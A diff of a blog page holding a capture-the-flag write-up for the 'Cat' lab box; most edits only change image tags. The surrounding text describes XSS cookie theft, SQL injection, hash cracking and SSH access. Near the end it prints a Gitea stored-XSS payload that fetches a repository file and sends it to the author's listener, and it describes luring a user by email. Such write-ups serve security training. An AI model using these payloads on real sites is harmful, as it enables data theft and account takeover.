@@ -213,12 +213,12 @@ This box focuses on web application vulnerabilities, specifically Cross-Site Scr
 </div>
 
   <div class="post-content"><h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
-<p><img alt="Cat" loading="lazy" src="/img/cat/Cat.png"></p>
+<img src="/blog/img/cat/Cat.png" alt="Cat" class="img-responsive" loading="lazy" />
 <p>This box focuses on web application vulnerabilities, specifically Cross-Site Scripting (<code>XSS</code>) and <code>SQL Injection</code>, leading to privilege escalation. We start with an Nmap scan to identify open ports and services. We then enumerate the web application, discovering an exposed Git repository and an XSS vulnerability in the cat registration feature. Exploiting the XSS allows us to capture an admin session cookie, granting access to an administrative panel. From there, we identify and exploit a SQL Injection vulnerability to dump user credentials, which leads to SSH access as a low-privileged user. Finally, we leverage another XSS vulnerability within a local Gitea instance, triggered by an internal mail service, to compromise a higher-privileged user and obtain the root flag.</p>
 
 
 
-<div id="flowchart-1751739581396370358" class="attack-path-flowchart">
+<div id="flowchart-1751740478192832776" class="attack-path-flowchart">
   <div class="flowchart-controls">
     <button class="zoom-btn" data-action="zoom-in" title="Zoom In">+</button>
     <button class="zoom-btn" data-action="zoom-out" title="Zoom Out">−</button>
@@ -663,24 +663,24 @@ Service detection performed. Please report any incorrect results at https://nmap
 <h1 id="2-gaining-initial-access">2. Gaining Initial Access<a hidden class="anchor" aria-hidden="true" href="#2-gaining-initial-access">#</a></h1>
 <h3 id="footprinting--exploring-the-site">Footprinting &amp; Exploring the Site<a hidden class="anchor" aria-hidden="true" href="#footprinting--exploring-the-site">#</a></h3>
 <p>Visiting <code>http://cat.htb/</code> in a browser, we see a website dedicated to a cat competition.</p>
-<p><img alt="Homepage" loading="lazy" src="/img/cat/Homepage.png"></p>
+<img src="/blog/img/cat/Homepage.png" alt="" class="img-responsive" loading="lazy" />
 <p><code>Wappalyzer</code> confirms the site is running Apache HTTP Server on Ubuntu and uses PHP.</p>
-<p><img alt="Wappalyzer" loading="lazy" src="/img/cat/Wappalyzer.png"></p>
+<img src="/blog/img/cat/Wappalyzer.png" alt="" class="img-responsive" loading="lazy" />
 <h3 id="exploring-the-site">Exploring the site:<a hidden class="anchor" aria-hidden="true" href="#exploring-the-site">#</a></h3>
 
 <div class="ctf-bullet-list">
     <ul>
 <li>
 <p>The Vote page (<a href="http://cat.htb/vote.php">http://cat.htb/vote.php</a>) indicates voting is closed and buttons are unresponsive.</p>
-<p><img alt="Vote" loading="lazy" src="/img/cat/vote.png"></p>
+  <img src="/blog/img/cat/vote.png" alt="" class="img-responsive" loading="lazy" />
 </li>
 <li>
 <p>The Contest page redirects to <a href="http://cat.htb/join.php">http://cat.htb/join.php</a>, where we can register a new user.</p>
-<p><img alt="redirect" loading="lazy" src="/img/cat/redirect.png"></p>
+  <img src="/blog/img/cat/redirect.png" alt="" class="img-responsive" loading="lazy" />
 </li>
 <li>
 <p>After registering, we can access <code>contest.php</code> to register a cat, which involves providing a cat name, age, birthdate, weight, and photo. This looks like a potential area for vulnerabilities like XSS or file upload exploits.</p>
-<p><img alt="testreg" loading="lazy" src="/img/cat/testreg.png"></p>
+  <img src="/blog/img/cat/testreg.png" alt="" class="img-responsive" loading="lazy" />
 </li>
 <li>
 <p>But assumptions can lead us into <code>rabbithole</code>. Let&rsquo;s try to recon.</p>
@@ -1026,9 +1026,9 @@ ________________________________________________
 </div>
 
 <p>We register a new account on <code>http://cat.htb/join.php</code> using the XSS payload as the username and any valid email/password.</p>
-<p><img alt="reg" loading="lazy" src="/img/cat/register.png"></p>
+<img src="/blog/img/cat/register.png" alt="" class="img-responsive" loading="lazy" />
 <p>Then, we log in with the newly registered XSS user and navigate to <code>contest.php</code> to register a cat. This action triggers the XSS, as the <code>owner_username</code> (containing our payload) is processed.</p>
-<p><img alt="regcat" loading="lazy" src="/img/cat/regcat.png"></p>
+<img src="/blog/img/cat/regcat.png" alt="" class="img-responsive" loading="lazy" />
 <p>On our PHP web server, we capture the base64 encoded cookie:</p>
 <div class="terminal-linux">
   <div class="terminal-header">
@@ -1070,24 +1070,24 @@ PHPSESSID=7n91dregjqjgiaub3tohphapc2
 </div>
 
 <p>We then use the browser&rsquo;s developer console to change our <code>PHPSESSID</code> cookie to the captured value:</p>
-<p><img alt="setcookie" loading="lazy" src="/img/cat/setcookie.png"></p>
+<img src="/blog/img/cat/setcookie.png" alt="" class="img-responsive" loading="lazy" />
 <p>After refreshing the site, we gain access to the admin panel:</p>
-<p><img alt="admin_panel" loading="lazy" src="/img/cat/admin_panel.png"></p>
+<img src="/blog/img/cat/admin_panel.png" alt="" class="img-responsive" loading="lazy" />
 <h3 id="sql-injection">SQL Injection<a hidden class="anchor" aria-hidden="true" href="#sql-injection">#</a></h3>
 
 <div class="ctf-bullet-list">
     <ul>
 <li>
 <p>From the dumped source code, <code>config.php</code> reveals that the application uses SQLite:<br>
-<img alt="config" loading="lazy" src="/img/cat/config.png"></p>
+<img src="/blog/img/cat/config.png" alt="" class="img-responsive" loading="lazy" /></p>
 </li>
 <li>
 <p>Further analysis of <code>accept_cat.php</code> shows a SQL Injection vulnerability in the <code>catName</code> parameter.<br>
-<img alt="accept_cat" loading="lazy" src="/img/cat/accept_cat.png"></p>
+<img src="/blog/img/cat/accept_cat.png" alt="" class="img-responsive" loading="lazy" /></p>
 </li>
 <li>
 <p>We intercept a request to <code>accept_cat.php</code> using Burp Suite and save it to a file named <code>accepet_cat.req</code>:<br>
-<img alt="intercept_acept" loading="lazy" src="/img/cat/intercept_acept.png"></p>
+<img src="/blog/img/cat/intercept_acept.png" alt="" class="img-responsive" loading="lazy" /></p>
 </li>
 </ul>
 
@@ -1502,7 +1502,7 @@ e41ccefa439fc454f7eadbf1f139ed8a
 </div>
 
 <p>Submitting these hashes to CrackStation, we find one cracked password:</p>
-<p><img alt="crackstation" loading="lazy" src="/img/cat/crackstation.png"></p>
+<img src="/blog/img/cat/crackstation.png" alt="" class="img-responsive" loading="lazy" />
 <p>We identify the user associated with the cracked hash:</p>
 <div class="terminal-linux">
   <div class="terminal-header">
@@ -1842,15 +1842,15 @@ Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
     <ul>
 <li>
 <p>Now, we can access <code>http://localhost:3000</code> in our browser. The Gitea instance shows three users when exploring.<br>
-<img alt="git_users" loading="lazy" src="/img/cat/git_users.png"></p>
+<img src="/blog/img/cat/git_users.png" alt="" class="img-responsive" loading="lazy" /></p>
 </li>
 <li>
 <p>Logging in as <code>axel</code> with his password, we notice the Gitea version is <code>1.22.0</code> in the footer.<br>
-<img alt="git_footer" loading="lazy" src="/img/cat/git_footer.png"></p>
+<img src="/blog/img/cat/git_footer.png" alt="" class="img-responsive" loading="lazy" /></p>
 </li>
 <li>
 <p>Searching for exploits for <code>Gitea 1.22.0</code>, we find a <code>Stored XSS</code> vulnerability.<br>
-<img alt="stored_xss" loading="lazy" src="/img/cat/stored_xss.png"></p>
+<img src="/blog/img/cat/stored_xss.png" alt="" class="img-responsive" loading="lazy" /></p>
 </li>
 <li>
 <p>The XSS vulnerability can be exploited by injecting a payload into the repository description. We aim to extract the <code>index.php</code> file from the <code>Employee-management</code> repository, as the email suggested <code>jobert</code> would review the repository.</p>
@@ -1952,7 +1952,7 @@ Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
 <p>We craft an XSS payload to fetch the content of <code>http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php</code> and send it to our local web server.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;javascript:fetch(&#39;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&#39;).then(r=&gt;r.text()).then(d=&gt;fetch(&#39;http://10.10.15.7:1234/?x=&#39;+encodeURIComponent(d)))&#34;</span><span class="o">&gt;</span><span class="nx">Click</span><span class="o">&lt;</span><span class="err">/a&gt;</span>
 </span></span></code></pre></div><p>We create a new repository in Gitea (e.g., <code>HALLO</code>) and paste the XSS payload into the Description field, ensuring &ldquo;Initialize this repository with a README.md&rdquo; is checked.</p>
-<p><img alt="repo" loading="lazy" src="/img/cat/repo.png"></p>
+<img src="/blog/img/cat/repo.png" alt="" class="img-responsive" loading="lazy" />
 <p>Next, we send an email to <code>jobert@localhost</code> with a link to our malicious repository, knowing that <code>jobert</code> will likely click it to review.</p>
 <div class="terminal-linux">
   <div class="terminal-header">
